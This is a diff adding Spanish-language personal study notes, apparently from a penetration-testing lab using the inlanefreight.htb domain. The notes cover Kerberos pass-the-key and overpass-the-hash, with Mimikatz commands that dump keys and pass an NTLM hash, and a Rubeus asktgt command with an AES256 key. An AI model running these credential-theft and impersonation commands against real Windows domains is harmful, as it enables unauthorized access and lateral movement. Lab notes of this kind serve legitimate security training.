@@ -21,3 +21,26 @@ Rubeus.exe dump /nowrap
 #####Crear nuestros propios tickets:
 
 ##Pass the key / overpass the hash:
+Mimikatz necesita privilegios de admin para realizar el paso de keys, rubeous, no.
+#Mimikats:
+extraemos las keys de kerberos:
+ mimikatz.exe
+privilege::debug
+sekurlsa::ekeys
+
+de aca sacamos el rc4/nltm
+luego enviamos las keys:
+mimikatz.exe
+privilege::debug
+sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
+Esto va a crear un cmd con el que vamos a poder relacionarnos con cualquier servicio en el contexto del user.
+
+#Rubeus:
+una vez extraídas las keys con mimikatz hacemos el pass the key:
+Rubeus.exe  asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
+
+######PASS the ticket
+
+
+
+
